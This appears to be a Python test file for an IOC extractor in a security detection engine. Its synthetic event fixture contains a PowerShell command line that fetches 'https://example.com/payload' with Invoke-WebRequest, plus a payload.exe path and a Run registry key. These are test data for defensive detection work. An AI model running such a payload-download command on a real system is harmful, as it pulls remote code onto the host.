
from datetime import datetime, timezone

from Engine.detection.models import SecurityEvent
from Engine.ioc import IOCExtractor, IOCResult


def make_event(**overrides):
    data = {
        "timestamp": datetime(2026, 10, 9, tzinfo=timezone.utc),
        "host": "WIN-TEST",
        "os": "windows",
        "event_type": "powershell_script",
        "user": "analyst",
        "process": "powershell.exe",
        "process_id": 1234,
        "parent_process": "explorer.exe",
        "command_line": (
            "powershell.exe -Command "
            "Invoke-WebRequest https://example.com/payload"
        ),
        "script_block_text": "",
        "source_ip": None,
        "destination_ip": "8.8.8.8",
        "source_port": None,
        "destination_port": 443,
        "protocol": "tcp",
        "file_path": None,
        "file_hash": None,
        "registry_key": None,
        "registry_value": None,
        "log_source": "windows",
        "raw_event": {},
    }
    data.update(overrides)
    return SecurityEvent(**data)


def test_extract_returns_ioc_result():
    result = IOCExtractor().extract(make_event())

    assert isinstance(result, IOCResult)


def test_extract_preserves_event_context():
    result = IOCExtractor().extract(make_event())

    assert result.event_host == "WIN-TEST"
    assert result.event_user == "analyst"
    assert result.event_timestamp is not None


def test_extract_structured_ip():
    result = IOCExtractor().extract(make_event())

    assert "8.8.8.8" in result.ips


def test_extract_generic_sha256_hash():
    sha256 = "a" * 64
    event = make_event(file_hash=sha256)

    result = IOCExtractor().extract(event)

    assert sha256 in result.sha256_hashes


def test_extract_explicit_file_path():
    path = r"C:\Users\Public\payload.exe"
    result = IOCExtractor().extract(make_event(file_path=path))

    assert path in result.file_paths


def test_extract_explicit_registry_key():
    key = r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
    result = IOCExtractor().extract(make_event(registry_key=key))

    assert key in result.registry_keys


def test_extract_accepts_dictionary():
    event = make_event().model_dump(mode="json")

    result = IOCExtractor().extract(event)

    assert result.event_host == "WIN-TEST"


def test_empty_event_has_no_indicators():
    event = make_event(
        process=None,
        parent_process=None,
        command_line=None,
        script_block_text=None,
        source_ip=None,
        destination_ip=None,
        file_path=None,
        file_hash=None,
        registry_key=None,
        registry_value=None,
        raw_event={},
    )

    result = IOCExtractor().extract(event)

    assert result.is_empty()


def test_batch_extraction():
    extractor = IOCExtractor()
    results = extractor.extract_batch([
        make_event(host="WIN-01"),
        make_event(host="WIN-02"),
    ])

    assert len(results) == 2
    assert results[0].event_host == "WIN-01"
    assert results[1].event_host == "WIN-02"


def test_to_dict_is_serializable():
    result = IOCExtractor().extract(make_event())

    data = result.to_dict()

    assert isinstance(data, dict)
    assert isinstance(data["ips"], list)
    assert isinstance(data["event_timestamp"], str)
